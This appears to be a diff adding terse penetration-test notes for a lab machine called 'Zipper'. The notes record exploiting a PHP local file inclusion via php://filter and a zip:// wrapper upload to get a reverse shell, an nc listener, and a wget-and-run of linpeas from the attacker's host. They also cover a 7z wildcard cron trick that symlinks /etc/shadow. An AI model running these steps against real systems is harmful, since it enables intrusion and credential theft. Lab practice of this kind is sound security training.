@@ -1,0 +1,106 @@
+Zipper 
+
+192.168.245.229
+
+http://192.168.245.229/index.php?file=home
+possibility of file inclusion 
+
+https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb
+https://www.netscylla.com/blog/2021/11/02/Exploiting_Local_File_Includes-in_PHP.html
+
+http://192.168.245.229/index.php?file=php://filter/convert.base64-encode/resource=index
+decode the content
+<?php
+$file = $_GET['file'];
+if(isset($file))
+{
+    include("$file".".php");
+}
+else
+{
+include("home.php");
+}
+?>
+http://192.168.245.229/index.php?file=php://filter/convert.base64-encode/resource=upload
+http://192.168.245.229/index.php?file=php://filter/convert.base64-encode/resource=home
+
+php zip wrapper exploit
+
+
+https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/
+tried to access http://192.168.245.229/uploads/ (forbidin but its exist)
+
+uploaded reverse shell and accessed
+
+http://192.168.245.229/index.php?file=zip://uploads/upload_1726747698.zip%23shell
+nc -nvlp 1234
+
+got shell
+
+wget http://192.168.45.173:440/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+
+cron
+/opt/backup.sh
+
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks
+
+check for upload folder
+/var/www/html/uploads
+ls -al
+
+7z execute
+
+touch @test.zip
+ln -s /etc/shadow test.zip
+evrything is ok
+nothing displayed
+
+
+cat /opt/backups/backup.log
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
